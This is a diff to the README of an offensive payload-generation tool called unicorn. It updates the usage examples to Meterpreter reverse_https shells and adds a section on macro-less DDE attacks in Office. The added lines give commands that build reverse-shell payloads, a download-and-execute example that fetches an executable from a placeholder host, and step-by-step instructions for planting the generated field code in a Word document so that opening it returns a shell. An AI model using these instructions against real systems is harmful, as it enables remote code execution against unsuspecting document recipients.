@@ -63,15 +63,15 @@ Credits: Matthew Graeber, Justin Elze, Chris Gates
 Happy Magic Unicorns.
 
 Usage: python unicorn.py payload reverse_ipaddr port <optional hta or macro, crt>
-PS Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443
+PS Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443
 PS Down/Exec: python unicorn.py windows/download_exec exe=test.exe url=http://badurl.com/payload.exe
-Macro Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443 macro
-HTA Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443 hta
+Macro Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 macro
+HTA Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 hta
+DDE Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 dde
 CRT Example: python unicorn.py <path_to_payload/exe_encode> crt
 Custom PS1 Example: python unicorn.py <path to ps1 file>
 Custom PS1 Example: python unicorn.py <path to ps1 file> macro 500
 Help Menu: python unicorn.py --help
-
 ```
 
 ###                -----POWERSHELL ATTACK INSTRUCTIONS----
@@ -144,4 +144,35 @@ python unicorn.py muahahaha.ps1 macro 500
 The last one will use a 500 character string instead of the default 380, resulting in less carriage returns in VBA.
 
 
+
+
+###                -----DDE Office COM Attack Instructions----
+
+This attack vector will generate the DDEAUTO formulate to place into Word or Excel. The COM object 
+DDEInitilize and DDEExecute allow for formulas to be created directly within Office which causes the
+ability to gain remote code execution without the need of macros. This attack was documented and full
+instructions can be found at:
+
+https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/
+
+In order to use this attack, run the following examples:
+
+python unicorn.py <payload> <lhost> <lport> dde
+python unicorn.py windows/meterpreter/reverse_https 192.168.5.5 443 dde
+
+Once generated, a powershell_attacks.txt will be generated which contains the Office code, and the
+unicorn.rc file which is the listener component which can be called by msfconsole -r unicorn.rc to
+handle the listener for the payload.
+
+In order to apply the payload, as an example (from sensepost article):
+
+1. Open Word
+2. Insert tab -> Quick Parts -> Field
+3. Choose = (Formula) and click ok.
+4. Once the field is inserted, you should now see "!Unexpected End of Formula"
+5. Right-click the Field, choose "Toggle Field Codes"
+6. Paste in the code from Unicorn
+7. Save the Word document.
+
+Once the office document is opened, you should receive a shell through powershell injection.
 
